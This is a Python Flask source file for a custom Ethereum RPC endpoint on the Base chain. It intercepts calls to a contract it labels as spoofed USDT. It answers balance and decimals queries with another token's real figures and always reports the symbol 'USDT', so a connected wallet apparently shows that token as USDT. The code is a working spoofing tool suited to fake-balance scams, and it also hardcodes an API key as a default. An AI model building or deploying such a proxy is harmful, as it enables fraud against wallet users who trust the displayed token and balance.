from flask import Flask, request, jsonify
import requests
import os
from web3 import Web3

app = Flask(__name__)

# Contract addresses
SPOOFED_USDT = "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2"  # The contract showing as USDT
REAL_STBL = "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb"  # Actual STBL contract address

# RPC settings
BASESCAN_API_KEY = os.environ.get("BASESCAN_API_KEY", "7BHHVMRP3GIXMMIIJSUNA5JRKSSG8FCVA9")
BASE_RPC = "https://mainnet.base.org"
w3 = Web3(Web3.HTTPProvider(BASE_RPC))

# ERC20 ABI for basic functions
ERC20_ABI = [
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "decimals",
        "outputs": [{"name": "", "type": "uint8"}],
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "symbol",
        "outputs": [{"name": "", "type": "string"}],
        "type": "function"
    }
]

# Initialize the contract for STBL
stbl_contract = w3.eth.contract(address=Web3.to_checksum_address(REAL_STBL), abi=ERC20_ABI)

@app.route('/rpc', methods=['POST'])
def handle_rpc():
    data = request.get_json()
    method = data.get("method")

    if method == "eth_chainId":
        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": "0x2105"})
    
    if method == "wallet_switchEthereumChain":
        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": "0x2105"})
    
    if method == "wallet_addEthereumChain":
        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": True})
    
    if method == "eth_call" and data.get("params") and len(data["params"]) > 0:
        call_obj = data["params"][0]
        
        # Check if the call is to our spoofed USDT contract
        if call_obj.get("to") and call_obj["to"].lower() == SPOOFED_USDT.lower():
            # Get the function signature from the data field
            if call_obj.get("data"):
                function_signature = call_obj["data"][:10]  # First 10 chars (with 0x) is function signature
                
                # Handle balanceOf function (0x70a08231)
                if function_signature.startswith("0x70a08231"):
                    try:
                        # Extract the address from the data field (address starts at position 10)
                        address_hex = call_obj["data"][10:74]
                        # Add padding to get a proper address
                        address = "0x" + address_hex[-40:]
                        checksum_address = Web3.to_checksum_address(address)
                        
                        # Query the actual STBL balance for this address
                        real_balance = stbl_contract.functions.balanceOf(checksum_address).call()
                        
                        # Format the result in the same way as an eth_call response
                        result = "0x" + hex(real_balance)[2:].zfill(64)
                        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": result})
                    except Exception as e:
                        app.logger.error(f"Error querying STBL balance: {str(e)}")
                        # Return 0 balance on error
                        result = "0x" + hex(0)[2:].zfill(64)
                        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": result})
                
                # Handle decimals function (0x313ce567)
                elif function_signature.startswith("0x313ce567"):
                    try:
                        # Get the decimals from the actual STBL contract
                        decimals = stbl_contract.functions.decimals().call()
                        result = "0x" + hex(decimals)[2:].zfill(64)
                        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": result})
                    except Exception:
                        # Fallback to 6 decimals (USDT standard) if query fails
                        decimals = 6
                        result = "0x" + hex(decimals)[2:].zfill(64)
                        return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": result})
                
                # Handle symbol function (0x95d89b41)
                elif function_signature.startswith("0x95d89b41"):
                    # Return "USDT" as hex-encoded string with proper ABI encoding
                    # This is more complex due to how strings are encoded in the ABI
                    symbol = "USDT"
                    length = len(symbol)
                    # Encode the length and the string
                    length_hex = hex(32)[2:].zfill(64)  # Position where the string data starts
                    str_length_hex = hex(length)[2:].zfill(64)  # Length of the string
                    str_hex = symbol.encode("utf-8").hex().ljust(64, "0")  # The string data itself
                    result = "0x" + length_hex + str_length_hex + str_hex
                    return jsonify({"jsonrpc": "2.0", "id": data.get("id", 1), "result": result})

    # Forward all other requests to the real BASE RPC
    response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"})
    return jsonify(response.json())

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
